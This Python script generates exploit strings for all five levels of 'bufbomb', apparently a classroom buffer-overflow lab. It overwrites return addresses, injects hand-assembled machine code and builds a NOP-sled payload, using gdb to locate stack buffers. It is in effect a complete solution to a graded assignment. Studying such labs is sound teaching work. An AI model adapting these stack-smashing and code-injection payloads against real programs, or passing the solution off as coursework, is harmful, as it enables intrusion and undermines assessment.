#!/usr/bin/env python3

import sys
import os
import tempfile
import struct
import argparse
import subprocess as sp

def run_gdb_commands(bomb, commands):
    with tempfile.NamedTemporaryFile() as temp:
        temp.write('\n'.join(commands).encode('utf-8'))
        temp.flush()
        proc = sp.run( ['gdb', '-nx', bomb, '-batch', '-x={}'.format(temp.name)]
                     , stdout=sp.PIPE
                     , text=True )
    return proc.stdout.strip().split('\n')

def copy(dest_arr, src_arr, idx):
    dest_arr[idx:idx+len(src_arr)] = src_arr

def exploit_0(bomb, cookie):
    exploit_bytes = bytearray([0x00] * 48)
    copy(exploit_bytes, struct.pack('i', 0x8048c18), 44)
    return bytes(exploit_bytes), 1

def exploit_1(bomb, cookie):
    exploit_bytes = bytearray([0x00] * 56)
    copy(exploit_bytes, struct.pack('i', 0x8048c42), 44)
    copy(exploit_bytes, struct.pack('i', cookie), 52)
    return bytes(exploit_bytes), 1

def exploit_2(bomb, cookie):
    commands = [ 'break *0x80490ae'
               , 'break getbuf'
               , 'run -u deadbeef > /dev/null'
               , 'set $eax=0x{:x}'.format(cookie)
               , 'continue'
               , 'printf "%p\\n", $ebp-0x28' ]
    buff_addr = int(run_gdb_commands(bomb, commands)[-1], 16)

    code_bytes = bytearray.fromhex('b8ffffffffb900d104088901689d8c0408c3')
    copy(code_bytes, struct.pack('i', cookie), 1)
    exploit_bytes = bytearray([0x00] * 48)
    copy(exploit_bytes, code_bytes, 0)
    copy(exploit_bytes, struct.pack('i', buff_addr), 44)
    return bytes(exploit_bytes), 1

def exploit_3(bomb, cookie):
    commands = [ 'break *0x80490ae'
               , 'break getbuf'
               , 'run -u deadbeef >/dev/null'
               , 'set $eax=0x{:x}'.format(cookie)
               , 'continue'
               , 'printf "%p\\n", $ebp-0x28'
               , 'printf "%x\\n", *(int*)$ebp' ]
    buff_addr, old_ebp = run_gdb_commands(bomb, commands)[-2:]
    buff_addr = int(buff_addr, 16)
    old_ebp   = int(old_ebp, 16)

    code_bytes = bytearray.fromhex('b8ffffffff68be8d0408c3')
    copy(code_bytes, struct.pack('i', cookie), 1)
    exploit_bytes = bytearray([0x00] * 48)
    copy(exploit_bytes, code_bytes, 0)
    copy(exploit_bytes, struct.pack('i', old_ebp), 40)
    copy(exploit_bytes, struct.pack('i', buff_addr), 44)
    return bytes(exploit_bytes), 1

def exploit_4(bomb, cookie):
    commands = [ 'break *0x80490ae'
               , 'break getbufn'
               , 'commands', 'silent', 'printf "%p\\n", $ebp-0x208', 'continue', 'end'
               , 'run -u deadbeef -n >/dev/null'
               , 'set $eax=0x{:x}'.format(cookie)
               , 'continue' ]
    buff_addr = max([ int(addr, 16)
                      for addr
                      in run_gdb_commands(bomb, commands)
                      if addr.startswith('0x') ])

    code_bytes = bytearray.fromhex('b8ffffffff8d6c2428683a8e0408c3')
    copy(code_bytes, struct.pack('i', cookie), 1)
    exploit_bytes = bytearray([0x90] * 528)
    copy(exploit_bytes, code_bytes, 520 - len(code_bytes))
    copy(exploit_bytes, struct.pack('i', buff_addr), 524)
    return bytes(exploit_bytes), 5

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Generate exploit strings for bufbomb given a cookie')
    parser.add_argument('bomb', help='path to bufbomb executable')
    parser.add_argument('level', metavar='[0-4]', type=int, choices=range(0, 5), help='level to exploit')
    args = parser.parse_args()

    data = sys.stdin.readline().strip()
    try:
        cookie = int(data, 16)
    except ValueError:
        print('Bad cookie: {}'.format(data))

    exploits = [ exploit_0, exploit_1, exploit_2, exploit_3, exploit_4 ]
    exploit_bytes, n = exploits[args.level](args.bomb, cookie)

    with os.fdopen(sys.stdout.fileno(), 'wb', closefd=False) as stdout:
        for _ in range(n):
            stdout.write(exploit_bytes)
            stdout.write(b'\n')
